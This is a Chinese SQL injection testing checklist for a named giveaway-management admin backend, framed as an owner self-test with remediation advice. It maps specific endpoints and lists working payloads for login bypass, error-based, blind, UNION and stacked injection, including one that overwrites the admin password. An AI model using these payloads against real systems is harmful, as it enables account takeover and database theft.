# SQL 注入测试清单（供面板方自测）

> 适用对象：助为科技 Giveaway 管理系统（`dashboard.autolak.in`）后端  
> 目的：系统化排查 admin 后台各接口是否存在 SQL 注入，尤其登录接口的认证绕过  
> 原则：**本清单仅供被授权方在测试环境执行，禁止在未授权情况下对生产系统发起攻击**



---

## 0. 测试前准备

| # | 事项    | 说明                                       |
| - | ----- | ---------------------------------------- |
| 1 | 授权确认  | 必须由系统所有者书面授权；记录测试时间窗口                    |
| 2 | 测试环境  | 优先用测试/预发环境；若必须在生产测，避开业务高峰并先备份            |
| 3 | 数据库备份 | 测试前完整备份，注入测试可能破坏数据或触发异常                  |
| 4 | 工具准备  | Burp Suite / sqlmap / 手动 curl + 浏览器开发者工具 |
| 5 | 日志留痕  | 记录每条 payload 与响应，便于追溯和修复                 |

---

## 1. 测试目标与范围

**后端基址**：`https://dashboard.autolak.in/admin`

**认证方式**（已知）：

- 登录 `POST /user/login`，参数 `{ userName, userPwd }`
- 登录成功返回 `token`（access_token）+ `roleId/roleName/userId/userName`
- 后续请求头携带 `Authorization: <access_token>` + `UserId` + `UserName`

**技术栈判断（待 owner 确认）**：

- 前端 Vue + Element UI（已确认）
- 后端疑似 Java / Spring Boot（从 dataBoard 接口报错风格 `Request method 'GET' not supported` 推断）
- 若为 Java 体系，重点排查 **MyBatis `${}` 拼接** 与 **JDBC Statement 拼接** 两类高危写法

---

## 2. 注入点地图（高风险接口清单）

> 这是从前端源码反推出的接口面，按 SQL 注入风险从高到低排序。

| 优先级   | 接口                                           | 方法   | 可注入参数                 | 注入类型                       |
| ----- | -------------------------------------------- | ---- | --------------------- | -------------------------- |
| 🔴 P0 | `/user/login`                                | POST | `userName`, `userPwd` | 认证绕过、布尔/时间盲注               |
| 🔴 P0 | `/user/searchUserPage`                       | POST | 分页、昵称、手机号、状态等筛选字段     | 报错/联合/盲注                   |
| 🟠 P1 | `/user/editOrInsertUser`                     | POST | 用户属性字段                | 联合/堆叠（写操作）                 |
| 🟠 P1 | `/user/updateUserStatus`                     | POST | `userId`、状态值          | 盲注                         |
| 🟠 P1 | `/role/searchRolePage`                       | POST | 角色名、分页                | 报错/联合                      |
| 🟠 P1 | `/role/editOrInsertRole`                     | POST | 角色字段                  | 联合/堆叠                      |
| 🟡 P2 | `/menu/searchMenus`、`/menu/searchAuthMenus`  | POST | 菜单名、角色                | 盲注                         |
| 🟡 P2 | `/sys/menu/delete`、`/sys/role/delete`        | POST | `id`                  | 盲注                         |
| 🟡 P2 | `/finance`、`/buyOrder`、`/withdrawAudit` 相关查询 | POST | 订单号、用户、时间范围、状态        | 报错/盲注                      |
| 🟢 P3 | `/task/upload-excel`                         | POST | 上传的 Excel 内容          | **二次注入**（Excel 单元格内容入库后触发） |

**重点说明**：所有带「查询筛选」「排序」「分页」「搜索」的参数都是注入高发点；`order by`、`group by`、`limit` 这类位置常被漏掉参数化。

---

## 3. 测试方法（按注入类型）

### 3.1 登录绕过（P0，最优先）

**目标**：判断 `userName` / `userPwd` 是否被拼接进 SQL 的 WHERE 条件。

**步骤**：

1. 正常登录一次，抓包记录请求与响应（基线）。
2. 在 `userName` 字段依次提交以下 payload（`userPwd` 随便填）：

```text
admin' --
admin' #
admin' or '1'='1
admin' or '1'='1' --
admin' or 1=1 --
' or 1=1 --
' or '1'='1' --
admin' or 'x'='x' #
admin") or ("1"="1
```

1. **判定标准**：
   - 若任一 payload 返回 `code:0` / 成功登录 / 返回了 token → **存在认证绕过型 SQL 注入（最高危）**。
   - 若统一返回「账号或密码错误」，且把 payload 当成普通字符串 → 大概率做了参数化或转义。
   - 若返回「SQL 语法错误」类报错 → 存在**报错型注入**（见 3.2）。
2. **特别注意**：`userPwd` 也要测（密码字段若拼接而非参数化，同样可注入，且常被漏掉）。

### 3.2 报错注入

**目标**：通过触发数据库报错，回显数据库名/表名/数据。

**适用位置**：登录外的所有查询接口（`searchUserPage` 等）。

**步骤**：

1. 向参数注入单引号 `'`、双引号 `"`、反斜杠 `\`，观察是否报错。
2. 若报错，改用数据库特定的报错函数：

```text
MySQL:      ' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- -
            ' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
SQL Server: ' and 1=convert(int,(select @@version))-- -
Oracle:     ' and 1=utl_inaddr.get_host_name((select user from dual))-- -
PostgreSQL: ' and 1=cast((select version()) as int)-- -
```

1. **判定**：回显中包含 `database()`、`@@version`、`version()` 的结果 → 注入成功且可拖库。

### 3.3 布尔盲注

**目标**：无报错回显时，通过页面/响应「真假」差异判断注入。

**步骤**：

```text
基线：  userName=test' and 1=1 --    → 应正常（若有该用户则返回结果）
对照：  userName=test' and 1=2 --    → 应异常/空结果
```

若两次响应存在稳定差异（一个有数据/一个无数据、或一个 200 一个 500）→ 存在布尔盲注，可用 `ascii(substr((select ...),n,1))>x` 逐字符拖库。

### 3.4 时间盲注

**目标**：连布尔差异都不明显时，用「响应延迟」判断。

**步骤**：

```text
MySQL:      test' and sleep(5)-- -
SQL Server: test' waitfor delay '0:0:5'-- -
Oracle:     test' and 1=dbms_pipe.receive_message('a',5)-- -
PostgreSQL: test' and 1=pg_sleep(5)-- -
```

**判定**：同一请求，注入后响应时间从毫秒级变成约 5 秒 → 时间盲注确认。

### 3.5 联合查询注入（UNION）

**目标**：直接回显其他表数据，最方便拖库。

**前提**：查询结果会回显在响应里（如用户列表）。

**步骤**：

1. 先用 `order by N` 猜列数：`test' order by 5-- -`、`test' order by 6-- -`，报错则列数 < N。
2. 猜出列数后构造：

```text
test' union select 1,2,3,4,5-- -
```

1. 观察响应里回显了哪个数字，把该位置换成 `database()` / `version()` / `(select group_concat(table_name) from information_schema.tables)`。

### 3.6 堆叠注入

**目标**：`;` 分隔执行多条 SQL，可直接改数据（提权、插管理员）。

```text
test'; update users set pwd='xxx' where userName='admin'-- -
```

**判定**：能执行第二条语句 → 严重，可写库、可插账号。

### 3.7 二次注入

**目标**：`task/upload-excel` 这类「内容入库后再被查询」的链路。

**步骤**：

1. 在 Excel 单元格里写 `xxx' or '1'='1`（或 `1' and sleep(5)`）。
2. 上传成功后，触发「查询/展示该数据」的功能。
3. **判定**：查询时触发注入效果 → 二次注入。

---

## 4. 判定标准汇总

| 现象                    | 结论          |
| --------------------- | ----------- |
| 登录 payload 成功返回 token | 认证绕过注入（最高危） |
| 回显数据库名/版本/表名          | 报错/联合注入，可拖库 |
| 1=1 / 1=2 响应稳定差异      | 布尔盲注        |
| 响应延迟 5s               | 时间盲注        |
| 能执行第二条 SQL            | 堆叠注入，可写库    |
| 上传内容触发注入              | 二次注入        |

---

## 5. 报告模板（测完按此填）

```
接口：/user/login
参数：userName
注入类型：□认证绕过 □报错 □布尔 □时间 □UNION □堆叠 □二次
Payload：
响应（含状态码+body片段）：
是否中招：是/否
数据库类型：MySQL/SQLServer/Oracle/PG/未知
影响：能否提权到 admin 角色？能否读其他表？
截图/复现步骤：
```

---

## 6. 防御建议（修复优先级）

| 优先级   | 措施                                               | 说明                                                   |
| ----- | ------------------------------------------------ | ---------------------------------------------------- |
| 🔴 P0 | **全部 SQL 改用参数化查询**                               | JDBC `PreparedStatement` / MyBatis 用 `#{}`（严禁 `${}`） |
| 🔴 P0 | 登录接口加**失败次数限制 + 验证码**                            | 防爆破；即使有注入也降低自动化利用                                    |
| 🟠 P1 | 对 `order by / group by / limit / 表名/列名` 做**白名单** | 这些位置无法参数化，只能白名单                                      |
| 🟠 P1 | 数据库账号**最小权限**                                    | 应用账号只给 SELECT/INSERT/UPDATE，不给 DDL/DROP/多表权限         |
| 🟠 P1 | 关闭数据库**报错回显**                                    | 生产环境不返回 SQL 错误详情                                     |
| 🟡 P2 | 上 WAF                                            | 拦截常见 SQL 注入特征（作纵深防御，不能替代参数化）                         |
| 🟡 P2 | 敏感数据脱敏                                           | 密码加盐哈希，避免拖库即泄密                                       |
| 🟢 P3 | 代码审计                                             | 全量排查 `${}`、`Statement`、字符串拼接 SQL                     |

---

## 7. 结论一句话

**admin 登录接口 `/user/login` 的 `userName`/`userPwd` 是整条链路的最高危注入点**——一旦可注入，即可绕过密码、伪造任意角色（含 admin）登录。请面板方按本清单在测试环境逐项验证，优先修复「参数化查询 + 登录失败限制」。
